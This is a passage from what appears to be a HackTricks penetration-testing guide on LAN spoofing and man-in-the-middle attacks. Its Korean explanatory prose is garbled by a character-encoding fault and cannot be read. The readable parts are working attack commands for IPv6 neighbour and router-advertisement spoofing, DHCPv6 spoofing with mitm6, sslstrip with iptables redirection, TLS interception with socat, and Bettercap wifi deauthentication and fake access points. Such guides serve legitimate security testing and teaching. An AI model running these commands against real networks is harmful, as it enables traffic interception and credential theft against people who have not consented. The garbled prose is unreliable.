ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Responderë¥¼ ì‚¬ìš©í•˜ì—¬ í˜¸ìŠ¤íŠ¸ê°€ ê²€ìƒ‰í•˜ëŠ” ì„œë¹„ìŠ¤ë¥¼ ê°€ì¥í•˜ì—¬ ê°€ì§œ ì‘ë‹µì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
[Responderë¡œ ì„œë¹„ìŠ¤ë¥¼ ê°€ì¥í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ë” ë§ì€ ì •ë³´ëŠ” ì—¬ê¸°ì—ì„œ í™•ì¸í•˜ì„¸ìš”](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

ë¸Œë¼ìš°ì €ëŠ” **Web Proxy Auto-Discovery (WPAD) í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì—¬ ìë™ìœ¼ë¡œ í”„ë¡ì‹œ ì„¤ì •ì„ íšë“í•©ë‹ˆë‹¤**. ì´ëŠ” "http://wpad.example.org/wpad.dat"ì™€ ê°™ì€ URLì„ í†µí•´ ì„œë²„ì—ì„œ êµ¬ì„± ì„¸ë¶€ì •ë³´ë¥¼ ê°€ì ¸ì˜¤ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. í´ë¼ì´ì–¸íŠ¸ê°€ ì´ ì„œë²„ë¥¼ ë°œê²¬í•˜ëŠ” ë°©ë²•ì€ ì—¬ëŸ¬ ê°€ì§€ê°€ ìˆìŠµë‹ˆë‹¤:

* **DHCP**ë¥¼ í†µí•´, ì—¬ê¸°ì„œ ë°œê²¬ì€ íŠ¹ë³„í•œ ì½”ë“œ 252 í•­ëª©ì„ ì‚¬ìš©í•˜ì—¬ ì´‰ì§„ë©ë‹ˆë‹¤.
* **DNS**ë¥¼ í†µí•´, ì´ëŠ” ë¡œì»¬ ë„ë©”ì¸ ë‚´ì—ì„œ _wpad_ë¼ëŠ” í˜¸ìŠ¤íŠ¸ ì´ë¦„ì„ ê²€ìƒ‰í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤.
* **Microsoft LLMNR ë° NBT-NS**ë¥¼ í†µí•´, ì´ëŠ” DNS ì¡°íšŒê°€ ì‹¤íŒ¨í•  ê²½ìš° ì‚¬ìš©ë˜ëŠ” ëŒ€ì²´ ë©”ì»¤ë‹ˆì¦˜ì…ë‹ˆë‹¤.

ë„êµ¬ ResponderëŠ” **ì•…ì„± WPAD ì„œë²„**ë¡œ ì‘ë™í•˜ì—¬ ì´ í”„ë¡œí† ì½œì„ ì´ìš©í•©ë‹ˆë‹¤. DHCP, DNS, LLMNR ë° NBT-NSë¥¼ ì‚¬ìš©í•˜ì—¬ í´ë¼ì´ì–¸íŠ¸ë¥¼ ì†ì—¬ ìì‹ ì—ê²Œ ì—°ê²°í•˜ë„ë¡ ìœ ë„í•©ë‹ˆë‹¤. Responderë¥¼ ì‚¬ìš©í•˜ì—¬ ì„œë¹„ìŠ¤ë¥¼ ê°€ì¥í•˜ëŠ” ë°©ë²•ì— ëŒ€í•´ ë” ê¹Šì´ ì•Œì•„ë³´ë ¤ë©´ [ì—¬ê¸°ë¥¼ í™•ì¸í•˜ì„¸ìš”](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

ë„¤íŠ¸ì›Œí¬ì—ì„œ ë‹¤ì–‘í•œ ì„œë¹„ìŠ¤ë¥¼ ì œê³µí•˜ì—¬ **ì‚¬ìš©ìë¥¼ ì†ì—¬ ì¼ë¶€ **í‰ë¬¸ ìê²© ì¦ëª…**ì„ ì…ë ¥í•˜ë„ë¡ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **ì´ ê³µê²©ì— ëŒ€í•œ ë” ë§ì€ ì •ë³´ëŠ”** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**ì—ì„œ í™•ì¸í•˜ì„¸ìš”.**

### IPv6 Neighbor Spoofing

ì´ ê³µê²©ì€ ARP ìŠ¤í‘¸í•‘ê³¼ ë§¤ìš° ìœ ì‚¬í•˜ì§€ë§Œ IPv6 ì„¸ê³„ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤. í”¼í•´ìê°€ GWì˜ IPv6ê°€ ê³µê²©ìì˜ MACì„ ê°€ì§€ê³  ìˆë‹¤ê³  ìƒê°í•˜ê²Œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 ë¼ìš°í„° ê´‘ê³  ìŠ¤í‘¸í•‘/í”ŒëŸ¬ë”©

ì¼ë¶€ ìš´ì˜ ì²´ì œëŠ” ë„¤íŠ¸ì›Œí¬ì—ì„œ ì „ì†¡ëœ RA íŒ¨í‚·ìœ¼ë¡œë¶€í„° ê¸°ë³¸ì ìœ¼ë¡œ ê²Œì´íŠ¸ì›¨ì´ë¥¼ êµ¬ì„±í•©ë‹ˆë‹¤. ê³µê²©ìë¥¼ IPv6 ë¼ìš°í„°ë¡œ ì„ ì–¸í•˜ë ¤ë©´ ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP ìŠ¤í‘¸í•‘

ê¸°ë³¸ì ìœ¼ë¡œ ì¼ë¶€ ìš´ì˜ ì²´ì œëŠ” ë„¤íŠ¸ì›Œí¬ì—ì„œ DHCPv6 íŒ¨í‚·ì„ ì½ì–´ DNSë¥¼ êµ¬ì„±í•˜ë ¤ê³  í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ ê³µê²©ìëŠ” ìì‹ ì„ DNSë¡œ êµ¬ì„±í•˜ê¸° ìœ„í•´ DHCPv6 íŒ¨í‚·ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. DHCPëŠ” ë˜í•œ í”¼í•´ìì—ê²Œ IPv6ë¥¼ ì œê³µí•©ë‹ˆë‹¤.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (ê°€ì§œ í˜ì´ì§€ ë° JS ì½”ë“œ ì£¼ì…)

## ì¸í„°ë„· ê³µê²©

### sslStrip

ê¸°ë³¸ì ìœ¼ë¡œ ì´ ê³µê²©ì€ **ì‚¬ìš©ì**ê°€ **HTTPS** ë²„ì „ìœ¼ë¡œ **ë¦¬ë””ë ‰ì…˜**ë˜ëŠ” **HTTP** í˜ì´ì§€ì— **ì ‘ê·¼**í•˜ë ¤ê³  í•  ë•Œ ë°œìƒí•©ë‹ˆë‹¤. **sslStrip**ëŠ” **í´ë¼ì´ì–¸íŠ¸ì™€**ì˜ **HTTP ì—°ê²°**ê³¼ **ì„œë²„ì™€**ì˜ **HTTPS ì—°ê²°**ì„ **ìœ ì§€**í•˜ì—¬ **ì¼ë°˜ í…ìŠ¤íŠ¸**ë¡œ ì—°ê²°ì„ **ìŠ¤ë‹ˆí•‘**í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
ë” ë§ì€ ì •ë³´ëŠ” [ì—¬ê¸°](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.

### sslStrip+ ë° dns2proxyë¥¼ í†µí•œ HSTS ìš°íšŒ

**sslStrip+ì™€ dns2proxy**ì˜ **ì°¨ì´ì **ì€ **sslStrip**ì— ë¹„í•´ **ì˜ˆë¥¼ ë“¤ì–´** _**www.facebook.com**_ **ì„** _**wwww.facebook.com**_ **ë¡œ** **ë¦¬ë‹¤ì´ë ‰íŠ¸**í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤ (ì—¬ê¸°ì„œ **ì¶”ê°€ëœ** "**w**"ì— ì£¼ëª©í•˜ì„¸ìš”) ê·¸ë¦¬ê³  **ì´ ë„ë©”ì¸ì˜ ì£¼ì†Œë¥¼ ê³µê²©ì IPë¡œ ì„¤ì •**í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ **í´ë¼ì´ì–¸íŠ¸**ëŠ” _**wwww.facebook.com**_ **(ê³µê²©ì)**ì— **ì—°ê²°**í•˜ì§€ë§Œ, ë’¤ì—ì„œëŠ” **sslstrip+**ê°€ **www.facebook.com**ê³¼ì˜ **ì‹¤ì œ ì—°ê²°**ì„ **ìœ ì§€**í•©ë‹ˆë‹¤.

ì´ ê¸°ìˆ ì˜ **ëª©í‘œ**ëŠ” **HSTSë¥¼ í”¼í•˜ëŠ” ê²ƒ**ì…ë‹ˆë‹¤. ì™œëƒí•˜ë©´ _**wwww**.facebook.com_ **ì€** ë¸Œë¼ìš°ì €ì˜ **ìºì‹œì—** ì €ì¥ë˜ì§€ ì•Šê¸° ë•Œë¬¸ì— ë¸Œë¼ìš°ì €ëŠ” **HTTPë¡œ facebook ì¸ì¦ì„ ìˆ˜í–‰í•˜ë„ë¡ ì†ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.\
ì´ ê³µê²©ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ì„œëŠ” í”¼í•´ìê°€ ì²˜ìŒì— [http://www.faceook.com](http://www.faceook.com)ì— ì ‘ê·¼í•´ì•¼ í•˜ë©°, httpsê°€ ì•„ë‹ˆì–´ì•¼ í•©ë‹ˆë‹¤. ì´ëŠ” http í˜ì´ì§€ ë‚´ì˜ ë§í¬ë¥¼ ìˆ˜ì •í•˜ì—¬ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë” ë§ì€ ì •ë³´ëŠ” [ì—¬ê¸°](https://www.bettercap.org/legacy/#hsts-bypass), [ì—¬ê¸°](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) ë° [ì—¬ê¸°](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.

**sslStrip ë˜ëŠ” sslStrip+ëŠ” ë” ì´ìƒ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì´ëŠ” ë¸Œë¼ìš°ì €ì— HSTS ê·œì¹™ì´ ë¯¸ë¦¬ ì €ì¥ë˜ì–´ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ë”°ë¼ì„œ ì‚¬ìš©ìê°€ "ì¤‘ìš”í•œ" ë„ë©”ì¸ì— ì²˜ìŒ ì ‘ê·¼í•˜ë”ë¼ë„ HTTPSë¥¼ í†µí•´ ì ‘ê·¼í•˜ê²Œ ë©ë‹ˆë‹¤. ë˜í•œ, ë¯¸ë¦¬ ì €ì¥ëœ ê·œì¹™ê³¼ ë‹¤ë¥¸ ìƒì„±ëœ ê·œì¹™ì€** [**`includeSubdomains`**](https://hstspreload.appspot.com) **í”Œë˜ê·¸ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ, ì´ì „ì˜ _**wwww.facebook.com**_ **ì˜ˆì œëŠ” ë” ì´ìƒ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì™œëƒí•˜ë©´** _**facebook.com**_ **ì´ `includeSubdomains`ì™€ í•¨ê»˜ HSTSë¥¼ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP í¬íŠ¸ì—ì„œ ìˆ˜ì‹  ëŒ€ê¸°
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL í¬íŠ¸ì—ì„œ ìˆ˜ì‹ 

#### í‚¤ ë° ìì²´ ì„œëª…ëœ ì¸ì¦ì„œ ìƒì„±
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### ì¸ì¦ì„œë¥¼ ì‚¬ìš©í•˜ì—¬ ìˆ˜ì‹  ëŒ€ê¸°
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### ì¸ì¦ì„œë¥¼ ì‚¬ìš©í•˜ì—¬ ìˆ˜ì‹ í•˜ê³  í˜¸ìŠ¤íŠ¸ë¡œ ë¦¬ë””ë ‰ì…˜í•˜ê¸°
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
ë•Œë•Œë¡œ í´ë¼ì´ì–¸íŠ¸ê°€ CAê°€ ìœ íš¨í•œì§€ í™•ì¸í•˜ë©´, **CAì— ì˜í•´ ì„œëª…ëœ ë‹¤ë¥¸ í˜¸ìŠ¤íŠ¸ ì´ë¦„ì˜ ì¸ì¦ì„œë¥¼ ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.\
ë˜ ë‹¤ë¥¸ í¥ë¯¸ë¡œìš´ í…ŒìŠ¤íŠ¸ëŠ” **ìš”ì²­ëœ í˜¸ìŠ¤íŠ¸ ì´ë¦„ì˜ ì¸ì¦ì„œë¥¼ ì œê³µí•˜ì§€ë§Œ ìì²´ ì„œëª…ëœ** ê²ƒì…ë‹ˆë‹¤.

í…ŒìŠ¤íŠ¸í•  ë‹¤ë¥¸ ì‚¬í•­ì€ ìœ íš¨í•œ CAê°€ ì•„ë‹Œ ìœ íš¨í•œ ì¸ì¦ì„œë¡œ ì¸ì¦ì„œì— ì„œëª…í•´ ë³´ê±°ë‚˜, ìœ íš¨í•œ ê³µê°œ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ diffie hellmanê³¼ ê°™ì€ ì•Œê³ ë¦¬ì¦˜ì„ ê°•ì œë¡œ ì‚¬ìš©í•˜ê³ (ì‹¤ì œ ê°œì¸ í‚¤ë¡œ ì•„ë¬´ê²ƒë„ ë³µí˜¸í™”í•  í•„ìš”ê°€ ì—†ëŠ” ì•Œê³ ë¦¬ì¦˜) í´ë¼ì´ì–¸íŠ¸ê°€ ì‹¤ì œ ê°œì¸ í‚¤ì˜ í”„ë¡œë¸Œ(í•´ì‹œì™€ ê°™ì€)ë¥¼ ìš”ì²­í•  ë•Œ ê°€ì§œ í”„ë¡œë¸Œë¥¼ ë³´ë‚´ê³  í´ë¼ì´ì–¸íŠ¸ê°€ ì´ë¥¼ í™•ì¸í•˜ì§€ ì•Šê¸°ë¥¼ ê¸°ëŒ€í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Active Discovery Notes

UDP íŒ¨í‚·ì´ ìš”ì²­ëœ í¬íŠ¸ê°€ ì—†ëŠ” ì¥ì¹˜ë¡œ ì „ì†¡ë  ë•Œ ICMP (Port Unreachable)ê°€ ì „ì†¡ëœë‹¤ëŠ” ì ì„ ê³ ë ¤í•˜ì„¸ìš”.

### **ARP discover**

ARP íŒ¨í‚·ì€ ë„¤íŠ¸ì›Œí¬ ë‚´ì—ì„œ ì‚¬ìš© ì¤‘ì¸ IPë¥¼ ë°œê²¬í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. PCëŠ” ê°€ëŠ¥í•œ ê° IP ì£¼ì†Œì— ëŒ€í•´ ìš”ì²­ì„ ë³´ë‚´ì•¼ í•˜ë©°, ì‚¬ìš© ì¤‘ì¸ IPë§Œ ì‘ë‹µí•©ë‹ˆë‹¤.

### **mDNS (multicast DNS)**

Bettercapì€ **\_services\_.dns-sd.\_udp.local**ì— ëŒ€í•œ MDNS ìš”ì²­ì„ (ë§¤ X msë§ˆë‹¤) ì „ì†¡í•˜ë©°, ì´ íŒ¨í‚·ì„ ë³´ëŠ” ë¨¸ì‹ ì€ ì¼ë°˜ì ìœ¼ë¡œ ì´ ìš”ì²­ì— ì‘ë‹µí•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ "services"ì— ì‘ë‹µí•˜ëŠ” ë¨¸ì‹ ë§Œ ê²€ìƒ‰í•©ë‹ˆë‹¤.

**Tools**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercapì€ ì´ë¦„ "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA"ì— ëŒ€í•´ í¬íŠ¸ 137/UDPë¡œ ë¸Œë¡œë“œìºìŠ¤íŠ¸ íŒ¨í‚·ì„ ì „ì†¡í•©ë‹ˆë‹¤.

### **SSDP (Simple Service Discovery Protocol)**

Bettercapì€ ëª¨ë“  ì¢…ë¥˜ì˜ ì„œë¹„ìŠ¤ë¥¼ ê²€ìƒ‰í•˜ê¸° ìœ„í•´ SSDP íŒ¨í‚·ì„ ë¸Œë¡œë“œìºìŠ¤íŠ¸í•©ë‹ˆë‹¤ (UDP í¬íŠ¸ 1900).

### **WSD (Web Service Discovery)**

Bettercapì€ ì„œë¹„ìŠ¤ë¥¼ ê²€ìƒ‰í•˜ê¸° ìœ„í•´ WSD íŒ¨í‚·ì„ ë¸Œë¡œë“œìºìŠ¤íŠ¸í•©ë‹ˆë‹¤ (UDP í¬íŠ¸ 3702).

## References

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3rd edition)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
